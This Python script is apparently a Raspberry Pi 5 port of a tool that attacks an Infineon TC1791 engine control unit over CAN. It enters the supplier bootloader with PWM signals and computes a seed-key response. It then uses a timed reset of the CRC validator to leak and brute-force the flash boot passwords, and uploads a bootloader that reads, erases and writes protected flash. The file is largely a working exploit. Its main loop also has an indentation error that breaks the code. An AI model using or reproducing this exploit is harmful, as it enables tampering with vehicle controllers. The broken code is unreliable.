#!/usr/bin/env python3
# Raspberry Pi 5–compatible TC1791 CAN BSL tool with
# lgpio + RPi.GPIO, hardware PWM, and basic auto-calibration
# Ported from https://github.com/bri3d/TC1791_CAN_BSL

import cmd
import crc_bruteforce
import can
from can import Message
import lz4.block
import math
from tqdm import tqdm
import struct
import time
import subprocess
from udsoncan.connections import IsoTPSocketConnection
import socket

import lgpio
import RPi.GPIO as GPIO

TWISTER_PATH = "../Simos18_SBOOT/twister"

# Initial guess; will be refined by calibrate_crc_delay()
CRC_DELAY = 0.0005
SEED_START = "1D00000"

sector_map_tc1791 = {
    0: 0x4000,
    1: 0x4000,
    2: 0x4000,
    3: 0x4000,
    4: 0x4000,
    5: 0x4000,
    6: 0x4000,
    7: 0x4000,
    8: 0x20000,
    9: 0x40000,
    10: 0x40000,
    11: 0x40000,
    12: 0x40000,
    13: 0x40000,
    14: 0x40000,
    15: 0x40000,
}


def bits(byte):
    bit_arr = [
        (byte >> 7) & 1,
        (byte >> 6) & 1,
        (byte >> 5) & 1,
        (byte >> 4) & 1,
        (byte >> 3) & 1,
        (byte >> 2) & 1,
        (byte >> 1) & 1,
        (byte) & 1,
    ]
    bit_arr.reverse()
    return bit_arr


def print_success_failure(data):
    if data[0] == 0xA0:
        print("Success")
    else:
        print("Failure! " + data.hex())


def get_key_from_seed(seed_data):
    p = subprocess.run(
        [TWISTER_PATH, SEED_START, seed_data, "1"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    output_data = p.stdout.decode("us-ascii")
    return output_data


# --- CAN + GPIO / PWM init for Pi 5 ---

can_interface = "can0"
bus = can.interface.Bus(interface="socketcan", channel="can0")

# lgpio for reset + BOOT_CFG
chip = lgpio.gpiochip_open(0)
RESET_PIN = 23
BOOTCFG_PIN = 24
lgpio.gpio_claim_output(chip, RESET_PIN)
lgpio.gpio_claim_output(chip, BOOTCFG_PIN)
lgpio.gpio_write(chip, RESET_PIN, 1)
lgpio.gpio_write(chip, BOOTCFG_PIN, 1)

# RPi.GPIO for PWM on 12/13
GPIO.setmode(GPIO.BCM)
PWM_PIN_1 = 12
PWM_PIN_2 = 13
GPIO.setup(PWM_PIN_1, GPIO.OUT)
GPIO.setup(PWM_PIN_2, GPIO.OUT)


def get_isotp_conn():
    conn = IsoTPSocketConnection(
        "can0", rxid=0x7E8, txid=0x7E0, params={"tx_padding": 0x55}
    )
    conn.tpsock.set_opts(txpad=0x55)
    conn.open()
    return conn


def sboot_pwm(duty1=50.0, duty2=50.0, freq=3210):
    """Start hardware PWM on GPIO 12 & 13 at given freq and duty."""
    pwm1 = GPIO.PWM(PWM_PIN_1, freq)
    pwm2 = GPIO.PWM(PWM_PIN_2, freq)
    pwm1.start(duty1)
    pwm2.start(duty2)
    return pwm1, pwm2


def reset_ecu():
    lgpio.gpio_write(chip, RESET_PIN, 0)
    time.sleep(0.01)
    lgpio.gpio_write(chip, RESET_PIN, 1)


def sboot_getseed():
    conn = get_isotp_conn()
    print("Sending 0x30 to elevate SBOOT shell status...")
    conn.send(bytes([0x30] + [0] * 12))
    print_success_failure(conn.wait_frame())
    time.sleep(1)
    print("Sending 0x54 Generate Seed...")
    conn.send(bytes([0x54]))
    data = conn.wait_frame()
    print_success_failure(data)
    data = data[9:]
    conn.close()
    return data


def sboot_sendkey(key_data):
    conn = get_isotp_conn()
    send_data = bytearray([0x65])
    send_data.extend(key_data)
    print("Sending 0x65 Security Access with Key...")
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    conn.close()


def prepare_upload_bsl():
    # Pin 24 -> BOOT_CFG pin, pulled to GND to enable BSL mode.
    print("Resetting ECU into HWCFG BSL Mode...")
    lgpio.gpio_write(chip, BOOTCFG_PIN, 0)


def upload_bsl(skip_prep=False):
    if skip_prep is False:
        prepare_upload_bsl()
    reset_ecu()
    time.sleep(0.1)
    # release BOOTCFG
    lgpio.gpio_write(chip, BOOTCFG_PIN, 1)

    print("Sending BSL initialization message...")
    bootloader_data = open("bootloader.bin", "rb").read()
    data = [
        0x55,
        0x55,
        0x00,
        0x01,
    ]
    data += struct.pack("<H", math.ceil(len(bootloader_data) / 8))
    data += [0x0, 0x3]
    init_message = Message(
        is_extended_id=False, dlc=8, arbitration_id=0x100, data=data
    )
    success = False
    bus.send(init_message)
    while success is False:
        message = bus.recv(0.5)
        if message is not None and not message.is_error_frame:
            if message.arbitration_id == 0x40:
                success = True
    print("Sending BSL data...")
    for block_base_address in tqdm(
        range(0, len(bootloader_data), 8), unit_scale=True, unit="blocks"
    ):
        block_end = min(len(bootloader_data), block_base_address + 8)
        message = Message(
            is_extended_id=False,
            dlc=8,
            arbitration_id=0xC0,
            data=bootloader_data[block_base_address:block_end],
        )
        bus.send(message, timeout=5)
        time.sleep(0.001)
    print("Device jumping into BSL... Draining receive queue...")
    while bus.recv(0.01) is not None:
        pass


def read_device_id():
    message = Message(
        is_extended_id=False,
        dlc=8,
        arbitration_id=0x300,
        data=[0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    )
    bus.send(message)
    device_id = bytearray()
    message = bus.recv()
    if message.data[0] == 0x1:
        device_id += message.data[2:8]
    message = bus.recv()
    if message.data[0] == 0x1 and message.data[1] == 0x1:
        device_id += message.data[2:8]
    return device_id


def read_byte(byte_specifier):
    data = bytearray([0x02])
    data += byte_specifier
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    byte_data = bytearray()
    message = bus.recv()
    if message.data[0] == 0x2:
        byte_data += message.data[1:5]
    return byte_data


def write_byte(addr, value):
    data = bytearray([0x03])
    data += addr
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    if message.data[0] != 0x3:
        return False
    data = bytearray([0x03])
    data += value
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    if message.data[0] != 0x3:
        return False
    else:
        return True


def send_passwords(pw1, pw2, ucb=0, read_write=0x8):
    data = bytearray([0x04])
    data += pw1
    data += bytearray([read_write, ucb, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    print(message)
    data = bytearray([0x04])
    data += pw2
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    print(message)
    data = bytearray([0x04])
    data += pw1
    data += bytearray([read_write, ucb, 0x1])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    print(message)
    data = bytearray([0x04])
    data += pw2
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    message = bus.recv()
    print(message)


def erase_sector(address):
    data = bytearray([0x05])
    data += address
    data += bytearray([0, 0, 0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    bus.recv()


def print_enabled_disabled(string, value):
    enabled_or_disabled = "ENABLED" if value > 0 else "DISABLED"
    print(string + " " + enabled_or_disabled)


def print_sector_status(string, procon_sector_status):
    current_address = 0
    for sector_number in sector_map_tc1791:
        protection_status = procon_sector_status[sector_number]
        if sector_number > 9:
            protection_status = procon_sector_status[
                math.ceil(
                    sector_number - (sector_number % 2) - (sector_number - 10) / 2
                )
            ]
        if protection_status > 0:
            print(
                string
                + "Sector "
                + str(sector_number)
                + " "
                + hex(current_address)
                + ":"
                + hex((current_address + sector_map_tc1791[sector_number]))
                + " : "
                + "ENABLED"
            )

        current_address += sector_map_tc1791[sector_number]


def read_flash_properties(flash_num, pmu_base_addr):
    FSR = 0x1010
    FCON = 0x1014
    PROCON0 = 0x1020
    PROCON1 = 0x1024
    PROCON2 = 0x1028
    fsr_value = read_byte(struct.pack(">I", pmu_base_addr + FSR))
    fcon_value = read_byte(struct.pack(">I", pmu_base_addr + FCON))
    procon0_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON0))
    procon1_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON1))
    procon2_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON2))
    pmem_string = "PMEM" + str(flash_num)
    flash_status = bits(fsr_value[2])
    print_enabled_disabled(pmem_string + " Protection Installation: ", flash_status[0])
    print_enabled_disabled(
        pmem_string + " Read Protection Installation: ", flash_status[2]
    )
    print_enabled_disabled(pmem_string + " Read Protection Inhibit: ", flash_status[3])
    print_enabled_disabled(pmem_string + " Write Protection User 0: ", flash_status[5])
    print_enabled_disabled(pmem_string + " Write Protection User 1: ", flash_status[6])
    print_enabled_disabled(pmem_string + " OTP Installation: ", flash_status[7])

    flash_status_write = bits(fsr_value[3])
    print_enabled_disabled(
        pmem_string + " Write Protection User 0 Inhibit: ", flash_status_write[1]
    )
    print_enabled_disabled(
        pmem_string + " Write Protection User 1 Inhibit: ", flash_status_write[2]
    )

    flash_status_overall = bits(fsr_value[0])
    print_enabled_disabled(pmem_string + " Page Mode Enabled: ", flash_status_overall[6])

    flash_status_errors = bits(fsr_value[1])
    print_enabled_disabled(
        pmem_string + " Flash Operation Error: ", flash_status_errors[0]
    )
    print_enabled_disabled(
        pmem_string + " Flash Command Sequence Error: ", flash_status_errors[2]
    )
    print_enabled_disabled(
        pmem_string + " Flash Locked Error: ", flash_status_errors[3]
    )
    print_enabled_disabled(pmem_string + " Flash ECC Error: ", flash_status_errors[4])

    protection_status = bits(fcon_value[2])
    print_enabled_disabled(pmem_string + " Read Protection: ", protection_status[0])
    print_enabled_disabled(
        pmem_string + " Disable Code Fetch from Flash Memory: ", protection_status[1]
    )
    print_enabled_disabled(
        pmem_string + " Disable Any Data Fetch from Flash: ", protection_status[2]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from DMA Controller: ", protection_status[4]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from PCP Controller: ", protection_status[5]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from SHE Controller: ", protection_status[6]
    )
    procon0_sector_status = bits(procon0_value[0]) + bits(procon0_value[1])
    print_sector_status(pmem_string + " USR0 Read Protection ", procon0_sector_status)
    procon1_sector_status = bits(procon1_value[0]) + bits(procon1_value[1])
    print_sector_status(pmem_string + " USR1 Write Protection ", procon1_sector_status)
    procon2_sector_status = bits(procon2_value[0]) + bits(procon2_value[1])
    print_sector_status(pmem_string + " USR2 OTP Protection ", procon2_sector_status)


def read_bytes_file(base_addr, size, filename):
    output_file = open(filename, "wb")
    for current_address in tqdm(
        range(base_addr, base_addr + size, 4), unit_scale=True, unit="block"
    ):
        b = read_byte(struct.pack(">I", current_address))
        output_file.write(b)
    output_file.close()


def read_compressed(address, size, filename):
    output_file = open(filename, "wb")
    data = bytearray([0x07])
    data += address
    data += size
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    bus.send(message)
    total_size_remaining = int.from_bytes(size, "big")
    t = tqdm(total=total_size_remaining, unit="B")
    while total_size_remaining > 0:
        message = bus.recv()
        compressed_size = size_remaining = int.from_bytes(message.data[5:8], "big")
        data = bytearray()
        sequence = 1
        while size_remaining > 0:
            message = bus.recv()
            new_sequence = message.data[1]
            if sequence != new_sequence:
                print("Sequencing error! " + hex(new_sequence) + hex(sequence))
                t.close()
                output_file.close()
                return
            sequence = (sequence + 1) & 0xFF
            data += message.data[2:8]
            size_remaining -= 6
        decompressed_data = lz4.block.decompress(data[:compressed_size], 4096)
        decompressed_size = len(decompressed_data)
        t.update(decompressed_size)
        total_size_remaining -= decompressed_size
        output_file.write(decompressed_data)
        data = bytearray([0x07, 0xAC])  # send an ACK packet
        message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
        bus.send(message)
    output_file.close()
    t.close()


def write_file(address, size, filename):
    input_file = open(filename, "rb")
    total_size_remaining = int.from_bytes(size, "big")
    t = tqdm(total=total_size_remaining, unit="B")
    address_int = int.from_bytes(address, "big")
    block_counter = 0
    while total_size_remaining > 0:
        if block_counter <= 0:
            block_counter = 256
            data = bytearray([0x06])
            address_bytes = address_int.to_bytes(4, "big")
            data += address_bytes
            message = Message(
                is_extended_id=False, dlc=8, arbitration_id=0x300, data=data
            )
            bus.send(message)
            bus.recv()
        if block_counter < 7:
            data_len = block_counter
        else:
            data_len = 7
        file_data = input_file.read(data_len)
        if len(file_data) == 0:
            break
        file_data += bytearray([0xAA] * (7 - len(file_data)))
        data = bytearray([0x06])
        data += bytearray(
            [
                file_data[0],
                file_data[1],
                file_data[2],
                file_data[3],
                file_data[4],
                file_data[5],
                file_data[6],
            ]
        )
        message = Message(
            is_extended_id=False, dlc=8, arbitration_id=0x300, data=data
        )
        bus.send(message)
        time.sleep(0.005)
        block_counter -= data_len
        total_size_remaining -= data_len
        t.update(data_len)
    input_file.close()
    t.close()


def sboot_crc_reset(crc_start_address):
    global CRC_DELAY
    prepare_upload_bsl()
    conn = get_isotp_conn()
    print("Setting initial CRC to 0x0...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print("Setting expected CRC to 0x0...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print("Setting start CRC range count to 1...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print(
        "Setting start CRC start address to boot passwords at "
        + crc_start_address.hex()
        + "..."
    )
    send_data = bytearray([0x78, 0x00, 0x00, 0x00, 0x0C])
    send_data.extend(int.from_bytes(crc_start_address, "big").to_bytes(4, "little"))
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print("Setting start CRC end address to a valid area at 0xb0010130...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x10, 0x30, 0x01, 0x01, 0xB0])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print("Uploading valid part number for part correlation validator...")
    send_data = bytes(
        [
            0x78,
            0x00,
            0x00,
            0x00,
            0x14,
            0x4E,
            0x42,
            0x30,
            0xD1,
            0x00,
            0x00,
            0x53,
            0x43,
            0x38,
            0x34,
            0x30,
            0x2D,
            0x31,
            0x30,
            0x32,
            0x36,
            0x31,
            0x39,
            0x39,
            0x31,
            0x41,
            0x41,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
        ]
    )
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    print("Starting Validator and rebooting into BSL...")
    conn.send(bytes([0x79]))
    time.sleep(CRC_DELAY)
    upload_bsl(True)
    crc_address = int.from_bytes(
        read_byte(0xD0010770.to_bytes(4, "big")), "little"
    )
    print("CRC Address Reached: ")
    print(hex(crc_address))
    crc_data = int.from_bytes(
        read_byte(0xD0010778.to_bytes(4, "big")), "little"
    )
    print("CRC32 Current Value: ")
    print(hex(crc_data))
    conn.close()
    return (crc_address, crc_data)


def sboot_shell(duty1=50.0, duty2=50.0):
    print("Setting up PWM waveforms...")
    pwm1, pwm2 = sboot_pwm(duty1=duty1, duty2=duty2)
    time.sleep(1)
    print("Resetting ECU into Supplier Bootloader...")
    reset_ecu()
    bus.send(Message(data=[0x59, 0x45], arbitration_id=0x7E0, is_extended_id=False))
    print("Sending 59 45...")
    bus.send(Message(data=[0x6B], arbitration_id=0x7E0, is_extended_id=False))
    stage2 = False
    while True:
        if stage2 is True:
            bus.send(
                Message(data=[0x6B], arbitration_id=0x7E0, is_extended_id=False)
            )
            print("Sending 6B...")
        message = bus.recv(0.01)
        print(message)
        if (
            message is not None
            and message.arbitration_id == 0x7E8
            and message.data[0] == 0xA0
        ):
            print("Got A0 message")
            if stage2:
                print("Switching to IsoTP Socket...")
                pwm1.stop()
                pwm2.stop()
                return sboot_getseed()
            print("Sending 6B...")
            stage2 = True
        if message is not None and message.arbitration_id == 0x0A7:
            print("FAILURE")
            pwm1.stop()
            pwm2.stop()
            return False


def sboot_login(duty1=50.0, duty2=50.0):
    sboot_seed = sboot_shell(duty1=duty1, duty2=duty2)
    print("Calculating key for seed: ")
    print(sboot_seed.hex())
    key = get_key_from_seed(sboot_seed.hex()[0:8])
    print("Key calculated : ")
    print(key)
    sboot_sendkey(bytearray.fromhex(key))


def extract_boot_passwords():
    addresses = map(
        lambda x: bytearray.fromhex(x),
        ["8001420C", "80014210", "80014214", "80014218"],
    )
    crcs = []
    for address in addresses:
        sboot_login()
        end_address, crc = sboot_crc_reset(address)
        print(address.hex() + " - " + hex(end_address) + " -> " + hex(crc))
        crcs.append(hex(crc))
    boot_passwords = crc_bruteforce.calculate_passwords(crcs)
    print(boot_passwords.hex())


# --- Auto-calibration helpers ---


def calibrate_crc_delay(start=0.0003, stop=0.0012, step=0.0001):
    """Sweep CRC_DELAY and pick the one where CRC address advances by 0x100."""
    global CRC_DELAY
    base_addr = bytearray.fromhex("8001420C")
    best = None
    print("Starting CRC_DELAY calibration sweep...")
    for d in [start + i * step for i in range(int((stop - start) / step) + 1)]:
        CRC_DELAY = d
        print(f"Trying CRC_DELAY={d:.7f}")
        addr_before, _ = sboot_crc_reset(base_addr)
        addr_after, _ = sboot_crc_reset(base_addr)
        delta = addr_after - addr_before
        print(f"Delta address: 0x{delta:X}")
        if delta == 0x100:
            best = d
            print(f"Found ideal CRC_DELAY={d:.7f}")
            break
    if best is not None:
        CRC_DELAY = best
    else:
        print("No perfect CRC_DELAY found in sweep; keeping last value.")


def calibrate_pwm_duty(duty_start=30.0, duty_stop=70.0, duty_step=5.0):
    """Sweep PWM duty cycle until SBOOT handshake (A0) succeeds."""
    print("Starting PWM duty calibration sweep...")
    for duty in [duty_start + i * duty_step for i in range(int((duty_stop - duty_start) / duty_step) + 1)]:
        print(f"Trying duty={duty}% on both channels...")
        seed = sboot_shell(duty1=duty, duty2=duty)
        if seed and isinstance(seed, (bytes, bytearray)) and len(seed) > 0:
            print(f"PWM duty {duty}% works for SBOOT.")
            return duty
    print("No working duty found in sweep; defaulting to 50%.")
    return 50.0


def main_menu():
    print("\n=== TC1791 CAN BSL – Raspberry Pi 5 CLI ===")
    print("1) Enter SBOOT (login)")
    print("2) Extract boot passwords")
    print("3) Upload BSL")
    print("4) Read device ID")
    print("5) Calibrate PWM duty cycle")
    print("6) Calibrate CRC_DELAY")
    print("7) Exit")
    choice = input("Select an option: ").strip()
    return choice
    

if __name__ == "__main__":
    try:
        print("=== TC1791 CAN BSL – Raspberry Pi 5 version ===")
        # Optional: run calibration once before serious work
        # duty = calibrate_pwm_duty()
        # calibrate_crc_delay()
        # Then use sboot_login(duty1=duty, duty2=duty) etc.
                while True:
            choice = main_menu()

            if choice == "1":
                print("Running SBOOT login...")
                sboot_login()

            elif choice == "2":
                print("Extracting boot passwords...")
                extract_boot_passwords()

            elif choice == "3":
                print("Uploading BSL...")
                upload_bsl()

            elif choice == "4":
                print("Reading device ID...")
                dev = read_device_id()
                print("Device ID:", dev.hex())

            elif choice == "5":
                print("Calibrating PWM duty cycle...")
                duty = calibrate_pwm_duty()
                print(f"Best duty cycle found: {duty}%")

            elif choice == "6":
                print("Calibrating CRC_DELAY...")
                calibrate_crc_delay()
                print(f"Final CRC_DELAY = {CRC_DELAY}")

            elif choice == "7":
                print("Exiting.")
                break

            else:
                print("Invalid choice. Try again.")
        
    finally:
        # Clean up GPIO on exit
        GPIO.cleanup()
        lgpio.gpiochip_close(chip)






